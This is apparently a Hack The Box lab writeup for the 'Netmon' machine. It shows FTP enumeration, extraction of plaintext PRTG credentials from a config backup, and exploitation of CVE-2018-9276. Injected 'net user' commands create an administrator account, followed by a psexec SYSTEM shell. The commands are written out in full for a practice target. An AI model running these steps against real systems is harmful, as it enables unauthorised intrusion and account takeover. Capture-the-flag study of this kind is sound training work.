# HTB Netmon — Writeup
**OS:** Windows Server 2016 (10.0.14393)
**Difficulty:** Easy
**Attack Vector:** FTP anonymous access + PRTG Network Monitor CVE-2018-9276 (authenticated RCE)
**System:** Arch Linux

---

## Summary

Netmon is a Windows Server machine running PRTG Network Monitor 18.1.37.13946 on port 80. Anonymous FTP access exposes the entire C: drive, including PRTG configuration backup files containing plaintext credentials. The backup password `PrTg@dmin2018` is incremented to `PrTg@dmin2019` for the current installation. Once authenticated to PRTG, CVE-2018-9276 (command injection via notification parameters) provides SYSTEM-level code execution, which is used to create a local admin user and gain a shell via psexec.

---

## Reconnaissance

### Port Scan
```bash
nmap -sV -Pn -T4 10.129.230.176
```

```
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          Microsoft ftpd
80/tcp   open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

Key observations:
- **Port 21** — FTP (anonymous access)
- **Port 80** — PRTG Network Monitor
- **Port 5985** — WinRM (useful for shell access with creds)

### FTP Enumeration
```bash
ftp 10.129.230.176
# Username: anonymous, Password: (blank)
```

Anonymous FTP exposes the **entire C: drive**:
```
ftp> ls
.rnd
inetpub/
PerfLogs/
Program Files/
Program Files (x86)/
Users/
Windows/
```

---

## Exploitation

### Step 1 — Extract PRTG Credentials via FTP

PRTG stores configuration in `C:\ProgramData\Paessler\PRTG Network Monitor`:

```
ftp> cd /ProgramData/Paessler/"PRTG Network Monitor"
ftp> get "PRTG Configuration.dat"
ftp> get "PRTG Configuration.old"
ftp> get "PRTG Configuration.old.bak"
```

Search the backup file for credentials:
```bash
grep -A 2 -B 2 "prtgadmin" "PRTG Configuration.old.bak"
```

```xml
<dbpassword>
  <!-- User: prtgadmin -->
  PrTg@dmin2018
</dbpassword>
```

### Step 2 — Login to PRTG

The backup is from 2018 but the box is from 2019 — increment the year:

- **Username:** `prtgadmin`
- **Password:** `PrTg@dmin2019` (2018 in backup → 2019 works)

### Step 3 — CVE-2018-9276: Authenticated RCE via Notification Command Injection

PRTG's notification feature allows executing scripts with user-controlled parameters. The `Demo EXE Notification - OutFile.ps1` script is vulnerable to command injection via semicolons in the `message` parameter.

Used the searchsploit exploit (`46527.sh`) to automate this:

```bash
# Get session cookie
./prtg-login.sh http://10.129.230.176 prtgadmin 'PrTg@dmin2019'

# Run exploit
./46527.sh -u http://10.129.230.176 -c "OCTOPUS1813713946=<cookie_value>"
```

**Problem:** The exploit script creates user `pentest` with password `P3nT3st!`, but the `!` character gets mangled by URL encoding/shell escaping, causing `STATUS_LOGON_FAILURE` when trying to authenticate.

**Fix:** Manually created notifications with a simpler password:

```bash
# Notification 1: Set password (no special chars that break in URL encoding)
# Injected command: net user pwned Hacked123@
# Notification 2: Add to administrators
# Injected command: net localgroup administrators pwned /add
```

Each notification was created via the PRTG API (`/editsettings`) and triggered individually via `/api/notificationtest.htm` with specific notification IDs.

### Step 4 — SYSTEM Shell via psexec

```bash
source venv/bin/activate
python3 /usr/bin/psexec.py 'pwned:Hacked123@@10.129.230.176'
```

```
[*] Found writable share ADMIN$
[*] Uploading file...
[*] Creating service...
[*] Starting service...
Microsoft Windows [Version 10.0.14393]
C:\Windows\system32>
```

### Alternative: Reading Flags via RCE (No Shell Needed)

Since the PRTG notification runs as SYSTEM, flags can be read without a full shell by redirecting output to a file readable via FTP:

```bash
# Injected command: type C:\Users\Administrator\Desktop\root.txt > C:\Users\Public\root.txt
# Then: curl -s ftp://anonymous:@10.129.230.176/Users/Public/root.txt
```

---

## Flags

```
User: <submitted>
Root: <submitted>
```

---

## Arch Linux Gotchas & Lessons Learned

| Problem | Fix |
|---|---|
| `evil-winrm` not in pacman | `yay -S evil-winrm-py` from AUR |
| `evil-winrm-py` NTLM auth fails (CryptographyDeprecationWarning) | Python 3.14 compatibility issue with ARC4 — use `psexec.py` instead |
| `psexec.py` missing `six` module | `pip install six impacket` inside venv |
| Exploit creates user but password doesn't work | The `!` in `P3nT3st!` gets destroyed by URL encoding — use a password without `!` |
| `net localgroup administrators /add pentest` wrong syntax | Correct: `net localgroup administrators pentest /add` (user before `/add`) |
| FTP doesn't show `ProgramData` folder | It exists but is hidden — `cd /ProgramData` directly works even though `ls` doesn't show it |
| PRTG command output is UTF-16 encoded | Files written by Windows commands have wide chars — readable but spaced out |
| Chaining commands with `&&` in injection | URL encoding breaks `&&` — use separate notifications for each command |

---

## Tools Used

- `nmap` — reconnaissance and service detection
- `ftp` — anonymous access to C: drive, credential extraction
- `curl` — PRTG API interaction, cookie extraction, notification creation/triggering
- `searchsploit` (`46527.sh`) — CVE-2018-9276 exploit reference
- `impacket` (`psexec.py`) — SYSTEM shell via SMB

---

*Five machines down. When the exploit script breaks, read the code and do it manually.* 🏆
